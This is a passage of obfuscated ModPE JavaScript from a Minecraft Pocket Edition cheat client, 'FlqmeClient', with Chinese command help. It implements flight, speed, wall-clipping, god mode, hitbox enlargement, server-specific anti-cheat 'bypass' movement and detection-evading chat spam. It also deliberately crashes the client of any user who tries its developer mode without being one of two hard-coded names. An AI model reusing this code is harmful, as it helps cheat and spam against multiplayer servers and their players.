        var _0x2bf6x190 = Entity['getY'](_0x2bf6x188);
        var _0x2bf6x191 = Entity['getZ'](_0x2bf6x188);
        Level['addParticle'](ParticleType['lava'], _0x2bf6x18f - 0.2, _0x2bf6x190 + 1, _0x2bf6x191, 0, 0, 0, 180);
        Level['addParticle'](ParticleType['flame'], _0x2bf6x18f - 0.2, _0x2bf6x190 + 1, _0x2bf6x191, 0, 0, 0, 400);
        Entity['setFireTicks'](_0x2bf6x188, 999)
    };
    if (_0x2bf6x187 == Player['getEntity']() && behindhitss) {
        var _0x2bf6x192 = getYaw() + 90;
        var _0x2bf6x193 = getPitch() - 180;
        x = Math['cos'](_0x2bf6x192 * (Math['PI'] / 180));
        y = Math['sin'](_0x2bf6x193 * (Math['PI'] / 180));
        z = Math['sin'](_0x2bf6x192 * (Math['PI'] / 180));
        setVelX(Player['getEntity'](), x * 1);
        setVelY(Player['getEntity'](), y * 1);
        setVelZ(Player['getEntity'](), z * 1)
    }
}

function destroyBlock(_0x2bf6x28, _0x2bf6x27, _0x2bf6x29, _0x2bf6x195) {
    if (forcedestroyss && getTile(_0x2bf6x28, _0x2bf6x27, _0x2bf6x29) != 0) {
        Level['setTile'](_0x2bf6x28, _0x2bf6x27, _0x2bf6x29, 0, 0)
    }
}

function useItem(_0x2bf6x28, _0x2bf6x27, _0x2bf6x29, _0x2bf6x197, _0x2bf6x198, _0x2bf6x195, _0x2bf6x199, _0x2bf6x19a) {
    if (tapjumpss) {
        setVelY(getPlayerEnt(), 0.4)
    };
    if (taptpss && getTile(_0x2bf6x28, _0x2bf6x27 + 1, _0x2bf6x29) == 0 && getTile(_0x2bf6x28, _0x2bf6x27 + 2, _0x2bf6x29) == 0) {
        Entity['setPosition'](Player['getEntity'](), _0x2bf6x28 + 0.5, _0x2bf6x27 + 2.63, _0x2bf6x29 + 0.5)
    };
    if (placetpss) {
        if (_0x2bf6x195 == BlockFace['NORTH']) {
            Entity['setPositionRelative'](getPlayerEnt(), 0, 0, -1)
        } else {
            if (_0x2bf6x195 == BlockFace['SOUTH']) {
                Entity['setPositionRelative'](getPlayerEnt(), 0, 0, 1)
            } else {
                if (_0x2bf6x195 == BlockFace['WEST']) {
                    Entity['setPositionRelative'](getPlayerEnt(), -1, 0, 0)
                } else {
                    if (_0x2bf6x195 == BlockFace['EAST']) {
                        Entity['setPositionRelative'](getPlayerEnt(), 1, 0, 0)
                    } else {
                        if (_0x2bf6x195 == BlockFace['UP']) {
                            Entity['setPositionRelative'](getPlayerEnt(), 0, 1, 0)
                        }
                    }
                }
            }
        }
    };
    if (ghosthandss && Player['getCarriedItem']() == 0) {
        Level['setTile'](_0x2bf6x28, _0x2bf6x27, _0x2bf6x29, 0, 0);
        Level['setTile'](_0x2bf6x28, _0x2bf6x27 - 1, _0x2bf6x29, 0, 0)
    }
}

function modTick() {
    timer++;
    var _0x2bf6x19c = Player['getX']();
    var _0x2bf6x19d = Player['getY']();
    var _0x2bf6x19e = Player['getZ']();
    var _0x2bf6x28 = Player['getX']();
    var _0x2bf6x27 = Player['getY']();
    var _0x2bf6x29 = Player['getZ']();
    if (antikbss || Entity['getHealth'](getPlayerEnt()) <= 0) {
        if (kbTick >= 1) {
            kbTick--
        } else {
            Entity['setImmobile'](getPlayerEnt(), false)
        };
        if (kbHealth > Entity['getHealth'](getPlayerEnt())) {
            Entity['setImmobile'](getPlayerEnt(), true);
            kbTick = 1
        };
        kbTick = 0;
        kbHealth = Entity['getHealth'](getPlayerEnt())
    };
    if (ndglidess) {
        setVelY(getPlayerEnt(), 0.00000001)
    };
    if (reachss) {
        if (Level['getGameMode']() == 0) {
            Level['setGameMode'](1);
            Player['setCanFly'](false)
        }
    };
    if (stepss && Utils['Player']['isCollidedHorizontally']()) {
        Entity['setPositionRelative'](getPlayerEnt(), 0, 1.6, 0)
    };
    if (cstepss && Utils['Player']['isCollidedHorizontally']()) {
        setVelY(Player['getEntity'](), 0.6)
    };
    if (speedss && Utils['Player']['isOnGround']()) {
        setVelX(getPlayerEnt(), Entity['getVelX'](getPlayerEnt()) * 1.5);
        setVelZ(getPlayerEnt(), Entity['getVelZ'](getPlayerEnt()) * 1.5)
    };
    if (zoomspeedss) {
        setVelX(getPlayerEnt(), Entity['getVelX'](getPlayerEnt()) * 1.1);
        setVelZ(getPlayerEnt(), Entity['getVelZ'](getPlayerEnt()) * 1.1)
    };
    if (upglidess) {
        setVelY(getPlayerEnt(), 0.3)
    };
    if (criticaltrailsss) {
        Level['addParticle'](ParticleType['crit'], getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 10)
    };
    if (highjumpss) {
        if (Entity['getVelY'](getPlayerEnt()) < -0.1) {
            setVelY(getPlayerEnt(), -0.5)
        };
        if (Entity['getVelY'](getPlayerEnt()) < 0.35 && Entity['getVelY'](getPlayerEnt()) > 0.2 && can == 1 && canGetHP == 1) {
            setVelY(getPlayerEnt(), 0.6);
            can = 2;
            HP = Entity['getHealth'](getPlayerEnt());
            canGetHP = 0
        };
        if (Entity['getVelY'](getPlayerEnt()) > gravity && can == 2) {
            Player['setHealth'](HP);
            canGetHP = 1;
            can = 0

        };
        if (Entity['getVelY'](getPlayerEnt()) == gravity && can == 0) {
            Player['setHealth'](HP);
            canGetHP = 1;
            can = 1
        }
    };
    if (isDev == false && Entity['getNameTag'](getPlayerEnt()) == 'FirePro9978' || Entity['getNameTag'](getPlayerEnt()) == 'NNeBBuRR') {
        canBeDev = true
    };
    if (autowalkss) {
        var _0x2bf6x13a = [0, 0, 0];
        toDirectionalVector(_0x2bf6x13a, (getYaw() + 90) * Math['PI'] / 180, getPitch() * Math['PI'] / 180 * -1);
        setVelX(getPlayerEnt(), 0.4 * _0x2bf6x13a[0]);
        setVelZ(getPlayerEnt(), 0.4 * _0x2bf6x13a[2])
    };
    if (jetpackss) {
        var _0x2bf6x192 = getYaw() + 90;
        var _0x2bf6x193 = getPitch() - 180;
        _0x2bf6x28 = Math['cos'](_0x2bf6x192 * (Math['PI'] / 180));
        _0x2bf6x27 = Math['sin'](_0x2bf6x193 * (Math['PI'] / 180));
        _0x2bf6x29 = Math['sin'](_0x2bf6x192 * (Math['PI'] / 180));
        setVelX(Player['getEntity'](), _0x2bf6x28 * 1);
        setVelY(Player['getEntity'](), _0x2bf6x27 * 1);
        setVelZ(Player['getEntity'](), _0x2bf6x29 * 1)
    };
    if (cspeedss) {
        if (Entity['isSneaking'](Player['getEntity']()) == true) {
            setVelY(getPlayerEnt(), -100.0);
            setVelX(getPlayerEnt(), Entity['getVelX'](getPlayerEnt()) * 1.7);
            setVelZ(getPlayerEnt(), Entity['getVelZ'](getPlayerEnt()) * 1.7)
        }
    };
    if (team[0] == null) {
        team['push']('随枫吖');
    };
    if (dolphinss && Utils['Player']['isInWater']()) {
        setVelY(getPlayerEnt(), 0.1)
    };
    if (solidliquidss) {
        Block['setShape'](8, null, null, null, null, null, null);
        Block['setShape'](9, null, null, null, null, null, null);
        Block['setShape'](10, null, null, null, null, null, null);
        Block['setShape'](11, null, null, null, null, null, null);
        Block['defineBlock'](8, 'Water', [
            ['still_water', 0]
        ], 8, true, 4);
        Block['defineBlock'](9, 'Stationary Water', [
            ['still_water', 0]
        ], 9, true, 4);
        Block['defineBlock'](10, 'Lava', [
            ['still_lava', 0]
        ], 10, true, 4);
        Block['defineBlock'](11, 'Stationary Lava', [
            ['still_lava', 0]
        ], 11, true, 4)
    };
    if (wallhackss) {
        Entity['setCollisionSize'](Player['getEntity'](), 0, 0)
    };
    if (glidess) {
        setVelY(getPlayerEnt(), -glideSpeed)
    };
    if (dmgglidess) {
        setPosition(getPlayerEnt(), _0x2bf6x19c, _0x2bf6x19d + 0.19, _0x2bf6x19e);
        setVelY(getPlayerEnt(), -0.3)
    };
    if (criticales && critTick < 22) {
        critTick++;
        if (critTick == 13) {
            Entity['setPositionRelative'](getPlayerEnt(), 0, 2, 0)
        };
        if (critTick == 12) {
            criticalTick = 12
        };
        if (criticalTick > 0) {
            criticalTick--;
            setVelY(getPlayerEnt(), -0.2)
        }
    };
    if (hitboxs) {
        ent = getNearestEntity(7);
        Entity.setCollisionSize(ent, 7.3, 10);
    }
    if (mineplexflys) {
        Player['setCanFly'](true);
        Player['setFlying'](true)
    };
    if (mineplexflys) {
        setVelY(getPlayerEnt(), -0.007);
    }
    if (inpvpflys) {
        setPosition(getPlayerEnt(), _0x2bf6x19c, _0x2bf6x19d + 0.19, _0x2bf6x19e);
        setVelY(getPlayerEnt(), -0.2)
    };
    if (autoswordss) {
        var _0x2bf6x19f = 0;
        var _0x2bf6x1a0 = Player['getInventorySlot'](_0x2bf6x19f);
        if (_0x2bf6x1a0 == 276 || _0x2bf6x1a0 == 268 || _0x2bf6x1a0 == 283 || _0x2bf6x1a0 == 267 || _0x2bf6x1a0 == 272) {
            var _0x2bf6x1a1 = _0x2bf6x19f
        } else {
            _0x2bf6x19f++
        };
        if (_0x2bf6x19f = 27) {
            _0x2bf6x19f = 0
        };
        var _0x2bf6x166 = getNearestEntity(7);
        if (_0x2bf6x166 != null && Player['getName'](_0x2bf6x166) != '' && Player['getName'](_0x2bf6x166) != ' ' && Player['getName'](_0x2bf6x166) != '  ' && isNotTeam(_0x2bf6x166)) {
            Player['setSelectedSlotId'](_0x2bf6x1a1)
        }
    };
    if (jumpspeedss && Utils['Player']['isOnGround']()) {
        setVelY(getPlayerEnt(), 0.2);
        setVelX(getPlayerEnt(), Entity['getVelX'](getPlayerEnt()) * 1.7);
        setVelZ(getPlayerEnt(), Entity['getVelZ'](getPlayerEnt()) * 1.7)
    };
    if (bypassglidess) {
        bgtick++;
        if (Entity['getVelY'](getPlayerEnt()) < 1) {
            setVelY(Player['getEntity'](), -0.2);
            if (bgtick == 8) {
                setVelY(getPlayerEnt(), -0.5);
                setVelX(getPlayerEnt(), 0);
                setVelZ(getPlayerEnt(), 0);
                bgtick = 0
            }
        }
    };
    if (longhopss && Utils['Player']['isOnGround']()) {
        lhtick++;
        if (lhtick >= 8) {
            lhtick = 0
        };
        if (Utils['Velocity']['calculateSpeed']() >= 0.106 && lhtick == 0) {
            var _0x2bf6x13a = [0, 0, 0];
            toDirectionalVector(_0x2bf6x13a, (getYaw() + 90) * Math['PI'] / 180, getPitch() * Math['PI'] / 180 * -1);
            setVelX(getPlayerEnt(), _0x2bf6x13a[0]);
            setVelY(getPlayerEnt(), 0.45);
            setVelZ(getPlayerEnt(), _0x2bf6x13a[2])
        } else {
            if (Utils['Velocity']['calculateSpeed']() <= 0.105 && lhtick == 0) {
                setVelX(getPlayerEnt(), 0);
                setVelZ(getPlayerEnt(), 0)
            }
        }
    };
    if (autoclimbss && Utils['Player']['isOnLadder']()) {
        setVelY(getPlayerEnt(), acspd)
    };
    if (sglidess) {
        Entity['setVelY'](getPlayerEnt(), -0.500);
        setVelX(getPlayerEnt(), Entity['getVelX'](getPlayerEnt()) * 1.2);
        setVelZ(getPlayerEnt(), Entity['getVelZ'](getPlayerEnt()) * 1.2)
    };
    if (fastbreakss) {
        Utils['Block']['fastBreak']()
    };
    if (fullbrightss) {
        Block['setLightLevel'](0, 15)
    };
    if (timer % 5 == 0 && Utils['Player']['isOnGround']()) {
        fallbackX = Player['getX']();
        fallbackY = Player['getY']();
        fallbackZ = Player['getZ']()
    };
    if (timer % 2 == 0 && Utils['Player']['isOnGround']()) {
        regenX = Player['getX']();
        regenZ = Player['getX']()
    };
    if (fallbackss) {
        var _0x2bf6x1a2 = Player['getX']();
        var _0x2bf6x1a3 = Player['getY']();
        var _0x2bf6x1a4 = Player['getZ']();
        if (fallbackY - 2 > _0x2bf6x1a3) {
            Entity['setPosition'](Player['getEntity'](), fallbackX, fallbackY, fallbackZ)
        }
    };
    if (fastfallss) {
        if (!Utils['Player']['isOnGround']() && Entity['getVelY'](getPlayerEnt()) <= -0.07840000092983246 || fallbackY - 2 > _0x2bf6x27) {
            setVelY(getPlayerEnt(), -100)
        }
    };
    if (regenerationss) {
        var _0x2bf6x1a2 = Player['getX']();
        var _0x2bf6x1a4 = Player['getZ']();
        if (Entity['getHealth'](getPlayerEnt()) != 20 && Player['getHunger']() == 20 && regenX == _0x2bf6x1a2 || regenZ == _0x2bf6x1a4) {
            ModPE['setGameSpeed'](120)
        } else {
            if (Entity['getHealth'](getPlayerEnt()) == 20 && regenX != _0x2bf6x1a2 || regenZ != _0x2bf6x1a4) {
                ModPE['setGameSpeed'](20)
            }
        }
    };
    if (sregenss) {
        ModPE['setGameSpeed'](120);
        Entity['setImmobile'](Player['getEntity'](), true)
    };
    if (lbsgspeedss) {
        ModPE['setGameSpeed'](30)
    };
    if (frostwalkerss) {
        var _0x2bf6x28 = Player['getX']();
        var _0x2bf6x27 = Player['getY']();
        var _0x2bf6x29 = Player['getZ']();
        if (getTile(_0x2bf6x28, _0x2bf6x27 - 2, _0x2bf6x29) == 8) {
            setTile(_0x2bf6x28, _0x2bf6x27 - 2, _0x2bf6x29, 79, 0)
        };
        if (getTile(_0x2bf6x28, _0x2bf6x27 - 2, _0x2bf6x29) == 9) {
            setTile(_0x2bf6x28, _0x2bf6x27 - 2, _0x2bf6x29, 79, 0)
        };
        if (getTile(_0x2bf6x28, _0x2bf6x27 - 2, _0x2bf6x29) == 10) {
            setTile(_0x2bf6x28, _0x2bf6x27 - 2, _0x2bf6x29, 4, 0)
        };
        if (getTile(_0x2bf6x28, _0x2bf6x27 - 2, _0x2bf6x29) == 11) {
            setTile(_0x2bf6x28, _0x2bf6x27 - 2, _0x2bf6x29, 4, 0)
        };
        if (getTile(_0x2bf6x28, _0x2bf6x27 - 1, _0x2bf6x29) == 8) {
            setTile(_0x2bf6x28, _0x2bf6x27 - 1, _0x2bf6x29, 79, 0);
            setPosition(getPlayerEnt(), _0x2bf6x28, _0x2bf6x27 + 1, _0x2bf6x29)
        };
        if (getTile(_0x2bf6x28, _0x2bf6x27 - 1, _0x2bf6x29) == 9) {
            setTile(_0x2bf6x28, _0x2bf6x27 - 1, _0x2bf6x29, 79, 0);
            setPosition(getPlayerEnt(), _0x2bf6x28, _0x2bf6x27 + 1, _0x2bf6x29)
        };
        if (getTile(_0x2bf6x28, _0x2bf6x27 - 1, _0x2bf6x29) == 10) {
            setTile(_0x2bf6x28, _0x2bf6x27 - 1, _0x2bf6x29, 4, 0);
            setPosition(getPlayerEnt(), _0x2bf6x28, _0x2bf6x27 + 1, _0x2bf6x29)
        };
        if (getTile(_0x2bf6x28, _0x2bf6x27 - 1, _0x2bf6x29) == 11) {
            setTile(_0x2bf6x28, _0x2bf6x27 - 1, _0x2bf6x29, 4, 0);
            setPosition(getPlayerEnt(), _0x2bf6x28, _0x2bf6x27 + 1, _0x2bf6x29)
        }
    };
    if (safewalkss) {
        Entity['setSneaking'](Player['getEntity'](), true)
    };
    if (scaffoldwalkss) {
        var _0x2bf6x28 = Player['getX']();
        var _0x2bf6x27 = Player['getY']();
        var _0x2bf6x29 = Player['getZ']();
        setTile(_0x2bf6x28, _0x2bf6x27 - 2, _0x2bf6x29, 87, 0)
    };
    if (arrowdodgess) {
        var _0x2bf6x1a5 = nearArrow(5);
        if (_0x2bf6x1a5 != null && Entity['getEntityTypeId'](_0x2bf6x1a5) == EntityType['ARROW']) {
            setPosition(getPlayerEnt(), _0x2bf6x28 + 0.5, _0x2bf6x27, _0x2bf6x29)
        }
    };
    if (bedbreakerss) {
        if (Player['getPointedBlockId']() == 26) {
            Level['destroyBlock'](Player['getPointedBlockX'](), Player['getPointedBlockY'](), Player['getPointedBlockZ'](), true)
        }
    };
    if (godmodes) {
        Player.setHealth(20);
    }
}

function chatHook(_0x2bf6x25) {
    var _0x2bf6x1a7 = _0x2bf6x25['split'](' ');
    var fct = '§l§4[§r§6随枫吖§l§4§l]§r§6: ';
    if (_0x2bf6x25['charAt'](0) == '!') {
        preventDefault();
        com['mojang']['minecraftpe']['MainActivity']['currentMainActivity']['get']()['updateTextboxText']('')
    };
    if (_0x2bf6x1a7[0] == '!') {
        clientMessage(fct + '命令不正确，请使用 !help <page>');
        preventDefault()
    };
    if (_0x2bf6x1a7[0] == '!help') {
        if (_0x2bf6x1a7[1] == '1' || _0x2bf6x1a7[1] == null) {
            clientMessage(fct + '帮助页码: 1/5');
            clientMessage(fct + '可用命令: ');
            clientMessage(fct + '!help > 查看可用的命令 > : !help <page>');
            clientMessage(fct + '!glidespeed > 使用滑动模块设置滑行速度 > 使用: !glidespeed <number> or default');
            clientMessage(fct + '!setfov > 用指定的数字设置FOV > 使用: !setfov <number or default>');
            clientMessage(fct + '!setspeed > 用指定的数字设置游戏速度 > 使用: !setspeed <number or default>');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] == '2') {
            clientMessage(fct + '帮助页码: 2/5');
            clientMessage(fct + '可用命令: ');
            clientMessage(fct + '!gamemode > 将您的游戏设置为指定的游戏 > 使用: !gamemode <number> or gamemode');
            clientMessage(fct + '!vclip > 输入数字给传送到新高度 > 使用: !vclip <number, can use - like -3>');
            clientMessage(fct + '!team > 添加或删除给定名称上的队友(可以不会自瞄他) > 使用: !team <add or remove> <nametag>');
            clientMessage(fct + '!teamlist > 在聊天中展示你的队友 > 使用: !teamlist');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] == '3') {
            clientMessage(fct + '帮助页码: 3/5');
            clientMessage(fct + '可用命令: ');
            clientMessage(fct + '!spam > 设置单词来使用刷屏 > 使用: !spam <word>');
            clientMessage(fct + '!spamdelay > 设置使用刷屏时的发送延迟 > 使用: !spamdelay <seconds>');
            clientMessage(fct + '!acspeed > 设定自动爬墙速度 > 使用: !acspeed <speed>');
            clientMessage(fct + '!nwrange > 设置玩家提示信息范围 > 使用: !nwrange <range>');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] == '4') {
            clientMessage(fct + '帮助页码: 4/5');
            clientMessage(fct + '可用命令: ');
            clientMessage(fct + '!freeze > 定住自己(你仍然可以看到发生了什么) > 使用: !freeze <on/off>');
            clientMessage(fct + '!info > 提供客户及其开发人员的信息 > 使用: !info');
            clientMessage(fct + '!tp > 设置坐标来传送自己 > 使用: !tp <x> <y> <z>');
            clientMessage(fct + '!theme > 改变主题 > 使用: !theme <flqme/infqrno>');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] == '5') {
            clientMessage(fct + '帮助页码: 5/5');
            clientMessage(fct + '可用命令: ');
            clientMessage(fct + '!search > 搜索给定文本(百度) > 使用: !search <text>');
            clientMessage(fct + '!fe > 强迫附魔手中的物品 > 使用: !fe <sword/bow/tool/armor>');
            preventDefault()
        }
    };
    if (_0x2bf6x1a7[0] == '!glidespeed') {
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '把数字放在!glidespeed后面. 例如: !glidespeed 5 将把滑行速度设置为0.5');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] != null && _0x2bf6x1a7[1] != 'default') {
            glideSpeed = _0x2bf6x1a7[1] * 0.1;
            clientMessage(fct + '滑行速度被设定为: ' + _0x2bf6x1a7[1] * 0.1);
            preventDefault()
        };
        if (_0x2bf6x1a7[1] == 'default') {
            glideSpeed = 0.3;
            clientMessage(fct + '滑行速度设置为默认');
            preventDefault()
        }
    };
    if (_0x2bf6x1a7[0] == '!setfov') {
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '把一个数字放在!setfov后面. 例如: !setfov 15 将会把视角变为15');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] != null && _0x2bf6x1a7[1] != 'default') {
            ModPE['setFov'](_0x2bf6x1a7[1]);
            clientMessage(fct + '视角设置为: ' + _0x2bf6x1a7[1]);
            preventDefault()
        };
        if (_0x2bf6x1a7[1] == 'default') {
            ModPE['resetFov']();
            clientMessage(fct + '视角设置为默认');
            preventDefault()
        }
    };
    if (_0x2bf6x1a7[0] == '!setspeed') {
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '把一个数字放在!setspeed后面. 例如: !setspeed 50 将会把游戏速度设置为50');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] != null && _0x2bf6x1a7[1] != 'default') {
            ModPE['setGameSpeed'](_0x2bf6x1a7[1]);
            clientMessage(fct + '游戏速度设置为: ' + _0x2bf6x1a7[1]);
            preventDefault()
        };
        if (_0x2bf6x1a7[1] == 'default') {
            ModPE['setGameSpeed'](20);
            clientMessage(fct + '游戏速度已设置为默认');
            preventDefault()
        }
    };
    if (_0x2bf6x1a7[0] == '!gamemode') {
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '使用模式切换指令!gamemode. 例如: !gamemode creative 或者 !gamemode 1 将会把你的模式设置为创造');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] != null) {
            var _0x2bf6x1a8;
            if (_0x2bf6x1a7[1] == '1') {
                _0x2bf6x1a8 = 1
            } else {
                if (_0x2bf6x1a7[1] == 'creative') {
                    _0x2bf6x1a8 = 1
                } else {
                    if (_0x2bf6x1a7[1] == '0') {
                        _0x2bf6x1a8 = 0
                    } else {
                        if (_0x2bf6x1a7[1] == 'survival') {
                            _0x2bf6x1a8 = 0
                        } else {
                            if (_0x2bf6x1a7[1] == '2') {
                                _0x2bf6x1a8 = 2
                            } else {
                                if (_0x2bf6x1a7[1] == 'adventure') {
                                    _0x2bf6x1a8 = 2
                                } else {
                                    if (_0x2bf6x1a7[1] == '3') {
                                        _0x2bf6x1a8 = 3
                                    } else {
                                        if (_0x2bf6x1a7[1] == 'spectator') {
                                            _0x2bf6x1a8 = 3
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            };
            Level['setGameMode'](_0x2bf6x1a8);
            clientMessage(fct + '游戏模式设置为: ' + _0x2bf6x1a7[1]);
            preventDefault()
        }
    };
    if (_0x2bf6x1a7[0] == '!vclip') {
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '放一个数字在!vclip后面. 例如: !vclip -5 将传送你-5个坐标');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] != null) {
            preventDefault();
            if (_0x2bf6x25['charAt'](8) == '-') {
                var _0x2bf6x1a9 = Utils['Text']['replaceAll']('-', '', _0x2bf6x1a7[1]);
                Entity['setPosition'](getPlayerEnt(), getPlayerX(), getPlayerY() - _0x2bf6x1a9, getPlayerZ());
                clientMessage(fct + 'Teleported ' + _0x2bf6x1a7[1] + ' blocks')
            } else {
                if (_0x2bf6x25['charAt'](8) != '-') {
                    Entity['setPositionRelative'](getPlayerEnt(), 0, +_0x2bf6x1a7[1], 0);
                    clientMessage(fct + 'Teleported ' + _0x2bf6x1a7[1] + ' blocks')
                }
            }
        }
    };
    if (_0x2bf6x1a7[0] == '!team') {
        if (_0x2bf6x1a7[1] == null || _0x2bf6x1a7[2] == null) {
            clientMessage(fct + '输入玩家名称在!team后面即可');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] != null && _0x2bf6x1a7[2] != null) {
            if (_0x2bf6x1a7[1] == 'add') {
                team['push'](_0x2bf6x1a7[2]);
                clientMessage(fct + 'Added ' + _0x2bf6x1a7[2] + ' 你的队友')
            };
            preventDefault()
        };
        if (_0x2bf6x1a7[1] == 'remove' && _0x2bf6x1a7[2] != '随枫吖') {
            for (i = 0; i < team['length']; i++) {
                if (team[i] == _0x2bf6x1a7[2]) {
                    team['splice'](i, 1);
                    clientMessage(fct + 'Removed ' + _0x2bf6x1a7[2] + ' 你的队友')
                }
            };
            if (_0x2bf6x1a7[2] == '随枫吖') {
                clientMessage(fct + '你不能删除队友')
            };
            preventDefault()
        }
    };
    if (_0x2bf6x1a7[0] == '!teamlist') {
        clientMessage(fct + '队伍玩家列表: ' + team);
        preventDefault()
    };
    if (_0x2bf6x1a7[0] == '!spam') {
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '放入本文在!spam后面(自动绕过检测). 例如: !spam void 将会一直刷void这条消息');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] != null) {
            spamText = _0x2bf6x1a7[1];
            clientMessage(fct + '刷屏消息设置为: ' + _0x2bf6x1a7[1]);
            preventDefault()
        }
    };
    if (_0x2bf6x1a7[0] == '!spamdelay') {
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '放一个数字在!spamdelay后面. 例如: !spamdelay 3.5 将会是刷屏速度设置为3.5秒');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] != null) {
            spamDelay = _0x2bf6x1a7[1] * 1000;
            if (_0x2bf6x1a7[1] == 1) {
                clientMessage(fct + '刷屏速度设置为: 1秒');
                preventDefault()
            } else {
                clientMessage(fct + '刷屏速度设置为: ' + _0x2bf6x1a7[1] + ' 秒');
                preventDefault()
            }
        }
    };
    if (_0x2bf6x1a7[0] == '!acspeed') {
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '放一个数字在!acspeed后面. 例如: !acspeed 5 将自动爬行速度设置为5');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] != null) {
            acspd = _0x2bf6x1a7[1] * 0.1;
            clientMessage(fct + '自动爬行速度设置为: ' + _0x2bf6x1a7[1] * 0.1);
            preventDefault()
        }
    };
    if (_0x2bf6x1a7[0] == '!devMode') {
        if (canBeDev == true && Entity['getNameTag'](getPlayerEnt()) == 'FirePro9978' || Entity['getNameTag'](getPlayerEnt()) == 'NNeBBuRR') {
            isDev = true;
            preventDefault();
            fctoast('开发模式启用！')
        } else {
            ccrash();
            fctoast('您正在尝试访问开发模式。崩溃的客户端...');
            preventDefault()
        }
    };
    if (_0x2bf6x1a7[0] == '!nwrange') {
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '放一个数字在!nwrange后面. 例如: !nwrange 10 将会把玩家信息显示范围设置为10');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] != null) {
            nwrange = _0x2bf6x1a7[1];
            clientMessage(fct + '玩家信息范围设置为: ' + _0x2bf6x1a7[1]);
            preventDefault()
        }
    };
    if (leetspeakss) {
        if (_0x2bf6x25['charAt'](0) != '!' && _0x2bf6x25['charAt'](0) != '/') {
            Server['sendChat'](' ' + convertToLeet(_0x2bf6x25))
        };
        preventDefault();
        com['mojang']['minecraftpe']['MainActivity']['currentMainActivity']['get']()['updateTextboxText']('')
    };
    if (_0x2bf6x1a7[0] == '!freeze') {
        if (_0x2bf6x1a7[1] == 'on') {
            Entity['setImmobile'](getPlayerEnt(), true);
            clientMessage(fct + '你现在都冻结了！')
        };
        if (_0x2bf6x1a7[1] == 'off') {
            Entity['setImmobile'](getPlayerEnt(), false);
            clientMessage(fct + '你现在可以移动了！')
        };
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '在!freeze后面放入on或者off来开启. 例如: !freeze on 将会让你不能动!freeze off则相反')
        }
    };
    if (_0x2bf6x1a7[0] == '!info') {
        clientMessage(fct + 'FlqmeClient: Alpha 6');
        clientMessage(fct + 'Flqme made by FirePro9978');
        clientMessage(fct + 'Translator:随枫吖');
        clientMessage(fct + 'Code Developers: NNeBBuRR, Hacker Lastaad, ArceusMatt, JohnMacroCraft');
        clientMessage(fct + 'Testers: MadMinerYT, AmayMask, Affann, iTzPurple, Smasher565, QuinnMakkinje, ImBannable, RealMCPvPER, KaosUlt, DinosaurusRex02');
        clientMessage(fct + 'Special Thanks to GodSoft029, Peacestorm, Apric0cks, NSITF MCPE, Pokey, SoloTroll and Purple xKai');
        clientMessage(fct + 'Contact us: Kik @FirePro9978, Email: coolpro9978@gmail.com');
        clientMessage(fct + 'Other Recommended Clients: Charged, GravePE, Nuke, Crimson, CyberZ, PokeyHack, Storm, NEB, SmashHaxPE, Flame, DragOP, Cloud, Xive, Hydom, Quvon, Vertex');
        fctoast('BehindHit and Escape idea was from Hacker Lastaad');
        fctoast('FallBack and CrouchSpeed Code was from NNeBBuRR')
    };
    if (_0x2bf6x1a7[0] == '!tp') {
        if (_0x2bf6x1a7[1] == null || _0x2bf6x1a7[2] == null || _0x2bf6x1a7[3] == null) {
            clientMessage(fct + '把坐标位置放在!tp后面. 例如: !tp 1 2 3 将会把你传送到x:1 y:2 z:3')
        };
        if (_0x2bf6x1a7[1] != null || _0x2bf6x1a7[2] != null || _0x2bf6x1a7[3] != null) {
            setPosition(getPlayerEnt(), _0x2bf6x1a7[1], _0x2bf6x1a7[2], _0x2bf6x1a7[3]);
            clientMessage(fct + '成功地传送到: X: ' + _0x2bf6x1a7[1] + ' Y: ' + _0x2bf6x1a7[2] + ' Z: ' + _0x2bf6x1a7[3])
        }
    };
    if (_0x2bf6x1a7[0] == '!theme') {
        if (_0x2bf6x1a7[1] == 'flqme') {
            theme = nbg;
            theme1 = mbg;
            module = nnbg;
            clientMessage(fct + '成功地改变为Floqme主题！')
        };
        if (_0x2bf6x1a7[1] == 'infqrno') {
            theme = iibg;
            theme1 = fbg;
            module = ibg;
            clientMessage(fct + '成功地改变为Infqrno主题！')
        };
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '主题:Floqme，Infqrno')
        }
    };
    if (_0x2bf6x1a7[0] == '!search') {
        var _0x2bf6x1aa = _0x2bf6x1a7[1];
        ctx['runOnUiThread'](new java['lang'].Runnable({
            run: function() {
                var _0x2bf6x1ab = new android['webkit'].WebView(ctx);
                var _0x2bf6x1ac = _0x2bf6x1ab['getSettings']();
                _0x2bf6x1ac['setJavaScriptEnabled'](true);
                _0x2bf6x1ab['setWebChromeClient'](new android['webkit'].WebChromeClient());
                _0x2bf6x1ab['setWebViewClient'](new android['webkit'].WebViewClient());
                _0x2bf6x1ab['loadUrl']('https://www.baidu.com/s?word=' + _0x2bf6x1aa);
                new android['app']['AlertDialog'].Builder(ctx)['setView'](_0x2bf6x1ab)['show']()
            }
        }))
    };
    if (_0x2bf6x1a7[0] == '!fe') {
        if (_0x2bf6x1a7[1] == 'sword') {
